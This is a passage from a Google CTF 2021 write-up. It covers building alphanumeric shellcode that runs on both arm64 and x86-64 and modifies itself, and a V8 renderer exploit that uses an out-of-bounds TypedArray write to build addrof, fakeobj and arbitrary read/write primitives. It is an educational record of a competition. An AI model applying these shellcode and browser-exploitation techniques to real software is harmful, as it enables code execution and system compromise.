Inspired by this [GitHub repo](https://github.com/ixty/xarch_shellcode/tree/master/stage0), we know that the first step is to use an instruction that acts as `nop` in architecture A and a `jmp` instruction in architecture B. Then, the instruction is ignored in architecture A and will jump to a different section in architecture B. The layout of our shellcode looks like this:


```
    +-------------+
    |   nop/jmp   |
    +-------------+
    |             |
    | shellcode A |
    |             |
    +-------------+
    |             |
    | shellcode B |
    |             |
    +-------------+

```

As stated in the above GitHub repo, `\x7d\xXX\x20\x32` is a nice gadget as this instruction is `orr w29, w11, #0x3fff` in `arm64v8`, which acted as `nop` without any side effect, and `\x7d\xXX` is `jge 0xXX` in `x86-64`.

Thus, the first 4 bytes of our shellcode should be this gadget and create our `arm64v8` shellcode in `shellcode A` and `x86-64` shellcode in `shellcode B`.

Note that in our case, `arm64v8` shellcode has more than 0x80 bytes. We would have to split our `arm64v8` shellcode and jump twice so that in `x86-64` we can jump to the correct location. A revised version of the layout of our shellcode:


```
    +---------------+
    |    nop/jmp    |
    +---------------+
    | shellcode arm |
    |   (part 1)    |
    +---------------+
    |    nop/jmp    |
    +---------------+
    | shellcode arm |
    |   (part 2)    |
    +---------------+
    | shellcode x64 |
    |               |
    +---------------+

```

#### Deal with familiar architecture first! (`x86-64`)

`x86-64` architecture is a much more "user-friendly"(?) architecture that most of the people are already familiar with. We then create and make this shellcode as short as possible so that we can have more bytes available for `arm64v8` shellcode.

The first edition is length 90: `'R[j3TYfi9WmWYAPX4\x7f0K<0k?0kC0KD0KE0C@0CB0KO0KP0KR0KX0KYhflagjWXHAg1vQZPP_VXS^ASZZPjT_PZWXZP'`. However, this shellcode is not easy to integrate due to fixed offset when self-modifying the shellcode.

Our second edition is length 88: `'j3TYfi9WmWYX,wP[4<0L3@0l3C0l3G0L3H0L3I0D3D0D3F0L3M0L3V0L3WhflagjWXHAg1vQZPP^jT_jTAZj(XZP'`. This shellcode will be our draft for final payload.

#### Learning `arm64v8` shellcode

We never write `aarch64` shellcode before, so the first step is to create a simple straightforward "orw" (stands for Open, Read, Write) shellcode. We used `pwntools` library and print out the assembly of `shellcraft.cat('flag')`.


```python
from pwn import *
context.arch = 'aarch64'
print(shellcraft.cat('flag'))

```

Then we get:


```
    /* push b'flag\x00\x00\x00\x00' */
    sub sp, sp, #16
    /* Set x0 = 1734437990 = 0x67616c66 */
    mov  x0, #27750
    movk x0, #26465, lsl #16
    stur x0, [sp, #16 * 0]
    /* call open('sp', 0, 'O_RDONLY') */
    mov  x0, sp
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #(SYS_open)
    svc 0
    /* call sendfile(1, 'x0', 0, 2147483647) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, xzr
    /* Set x3 = 2147483647 = 0x7fffffff */
    mov  x3, #65535
    movk x3, #32767, lsl #16
    mov  x8, #(SYS_sendfile)
    svc 0

```

Now we need to transform the above assembly into a shellcode that uses alphanumeric bytes.

##### System call

The instruction `svc` in aarch64 stands for "supervisor call". It works like `syscall` in x86-64. However, if we look up section C3.2.3 of [aarch64 machine code table](https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf), we know that the two most significant bytes is definitely not alphanumeric. Therefore, we must come up with a workaround. Note that our goal for now is to generate a `svc #257` instruction, whose machine code is `b'! \x00\xd4'`. We only have two invalid bytes (`b'\x00\xd4`).

The workaround is that we send `b'! AA'` as placeholder and dynamically change `b'AA'` into `b'\x00\xd4`. To achieve this, we observe that the registers `x0` and `x1` always point to our shellcode. Therefore, we can use `strb w??, [x1, x??]` or `strh w??, [x1, x??]` to dynamically modify our shellcode.

Note that due to the mechanism of instruction cache and data cache, we have to put a branch instruction (not taken) after we finish modifying the shellcode. Otherwise, the instruction cache will not be flushed and the CPU still sees the old placeholders. The branch instruction we use is `cbnz w26, 0x40404`.

##### Loading an arbitrary integer into a register

Let's say the `svc #257` instruction is at the 64th~67th byte of our shellcode, and we want to use `strh w9, [x1, x25]` to replace the 67th byte. That is, `w9` should be `0xd4` and `w25` should be `0x43`. To achieve this, we find [this paper](https://arxiv.org/pdf/1608.03415.pdf), whose section 4.1.2 gives us a great hint. We come up with the following shellcode:


```
/* w26 is always 0 by our observation */
adds w17, w26, #2460
subs w9, w17, #2248 /* w9 = 0xd4 */
adds w17, w26, #2131
subs w25, w11, #2064 /* w25 = 0x43 */
strb w9, [x1, x25]

cbnz w26, 0x40404 /* branch instruction for i-cache flushing */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */

/* svc #257 */ /* below is the 64th~67th byte */
.inst 0x41413021  /* the two 0x41 is the placeholder */

```

As a check, the assembled machine code is `b'Qs&1)"#qQO!1yA q)h98:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5!0AA'`, which is alphanumeric. The above shellcode can change the 67th byte from `b'A'` to `b'\xd4'`. Read the field specification of `adds` and `subs` machine code. It should be straightforward to construct a alphanumeric `adds` and `subs` pair that loads arbitrary byte into a register.

To sum up, we have a powerful technique that can dynamically modify our shellcode. This means we can execute almost any shellcode we want!

#### Optimization

Everything looks so nice ... except that we have a 280 byte limit. Though it seems we can execute arbitrary shellcode, dynamically modify a single byte costs 5 instructions in the previous demonstration. That's why we still need a lot of manual optimization to make our shellcode more compact.

##### Optimization: `openat(-100, "flag", 0, 0)`

To open the file "flag", we have to set `x0` to -100, and `x1` points at the string "flag".

The `x1` part seems to be easier. We just uses `adds x1, x1, 0x??` to make `x1` points at the "flag" string in x86-64 shellcode. However, bad news is that `x1` is a pointer on 64-bit architecture, and both 64-bit `adds` or `subs` are not alphanumeric. We have no choice but use dynamic modification of our shellcode.

The `x0` part has the same problem. We cannot use any 32-bit instruction to make `x0` a -100 in 64-bit. Therefore, we still need dynamic modification of our shellcode.

##### Optimization: use `strh`

In previous demonstration, we use `strb` to modify our shellcode, which change a single bit at a time. In some special situation, we can use `strh` to modify 2 bytes at a time. It can make our modification much more efficient.

The reason is that `adds` and `subs` has a 12-bit immediate, and the immediate's position in the instruction is special. If the immediate is between `[0x0, 0x7ff]`, then we may have a chance to use `strh`. Please refer to the final payload for demonstration.

##### Optimization: reuse `adds`

This is probably the most important optimization in our solution. We analyze every byte which we need to load into registers, and we find out that we can use only few `adds` to cover all the byte we need to modify. For example, we need `0xb1`, `0xba`, `0xbb`, and `0xf1`. We can reuse `adds ` as follows:


```
adds w18, w26, #2508
subs w10, w18, #2331 /* w10 = 0xb1 */
subs w11, w18, #2322 /* w11 = 0xba */
subs w12, w18, #2321 /* w12 = 0xbb */
subs w13, w18, #2267 /* w13 = 0xf1 */

```

In this way, we significantly reduce the number of instructions in our payload.

#### The final payload

https://gist.github.com/ktpss95112/319735f78335cf4088239a1b9883811f

flag: `CTF{abc_easy_as_svc}`

#### Postscript

After the contest, we read the official writeup. Their approach is to call `execve("/bin/cat", {"/bin/cat", "flag", 0})`, which requires only one system call. This inspire us that we can construct a more compact payload - use no system call! We observe that `x17` contains the libc address of `read()` when our shellcode is executed. That is, we can use `x17` to obtain the address of `system()`, and then simply `system("/bin/cat flag")`. No system call, and only one parameter to prepare.

#### References

* x86-64 `jge` machine code: https://www.felixcloutier.com/x86/jcc
* Use `gdb` to debug aarch64 binary on x86-64: https://dev.to/offlinemark/how-to-set-up-an-arm64-playground-on-ubuntu-18-04-27i6
* Cross architecture shellcode: https://github.com/ixty/xarch_shellcode
* A useful slides introducing common aarch64 instruction's machine code: https://www.cs.princeton.edu/courses/archive/spr19/cos217/lectures/16_MachineLang.pdf
* A general guide of generating alphanumeric shellcode in aarch64: https://arxiv.org/pdf/1608.03415.pdf
* aarch64 machine code table: https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf


## Pwn

### EBPF

https://github.com/st424204/ctf_practice/tree/master/GoogleCTF2021/EBPF

flag: `CTF{wh0_v3r1f1e5_7h3_v3r1f1er_c9716a89aa5d92a}`
### Fullchain

The challenge gave us a vulnerable Chromium browser ( which contains vulnerabilities in two different parts: the V8 engine and the Mojo interface ) and a vulnerable linux kernel module. We were asked to pwn the entire thing: the V8 engine, the Chrome sandbox and the kernel module -- all with a single fullchain exploit.

#### Renderer RCE ( V8 )

The challenge introduces a patch into V8 Javascript engine. It comments out three lines in function `TypedArrayPrototypeSetTypedArray`: 


```diff=
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..ac5ebe9913 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
 
   // 9. Let targetLength be target.[[ArrayLength]].
-  const targetLength = target.length;
+  // const targetLength = target.length;
 
   // 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr = typedArray.length;
@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
 
   // 21. If srcLength + targetOffset > targetLength, throw a RangeError
   //   exception.
-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  //     otherwise IfOffsetOutOfBounds;
 
   // 12. Let targetName be the String value of target.[[TypedArrayName]].
   // 13. Let targetType be the Element Type value in Table 62 for

```

This function will be called if we want to set a TypedArray within a TypedArray in Javascript. From the patch, it comments out a overflow check when `srcLength` plus `targetOffset` is larger than `targetLength` ( see the following Javascript for example ). If the patch was not introduced, it will throw an exception when we want to set a TypedArray larger than the src TypedArray. But because of this patch, we can bypass the overflow check and set the array with index 9 as the starting position. It's actually a very powerful out-of-bound write, and we use this vulnerability to overwrite `uint32`'s length to make us use this `uint32` to achieve out-of-bound read/write.


```javascript
const uint32 = new Uint32Array([0x1000]);
oob_access_array = [uint32];
var f64 = new Float64Array([1.1]);
uint32.set(uint32, 9);
console.log(uint32.length); // 0x1000

```

Because we allocate a Javascript `Array` after `TypedArray`, we can also modify its element as `Integer` from `uint32`. We use it to create a primitive function `addrof` by placing the object in `oob_access_array` and get its address from `uint32` at index 0x15. Another primitive function `fakeobj` is done by placing the arbitrary address at index 0x15 of `uint32` and get fake object from `oob_access_array`.


```javascript
function addrof(in_obj) {
    oob_access_array[0] = in_obj;
    return uint32[0x15];
}
function fakeobj(addr) {
    uint32[0x15] = addr;
    return oob_access_array[0];
}


```

We also leak `float_array_map` from `uint32` at index 62 and V8 heap base address from `uint32` at index 12. With `float_array_map` we can create a fake float array for arbitrary address read/write. With V8 heap base, we can read some useful content using arbitrary read/write on V8 heap.


```javascript
var float_array_map = uint32[62];
if (float_array_map == 0x3ff19999)
    float_array_map = uint32[63];

var arr2 = [itof(BigInt(float_array_map)), itof(0n), itof(8n), itof(1n), itof(0x1234n), 0, 0].slice();
var fake = fakeobj(addrof(arr2) - 0x38);
var v8_heap = BigInt(uint32[12]) << 32n;

function arbread(addr) {
    arr2[5] = itof(addr);
    return ftoi(fake[0]);
}

function arbwrite(addr, val) {
    arr2[5] = itof(addr);
    fake[0] = itof(val);
}

```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20210717-googlectf2021/README.md>*
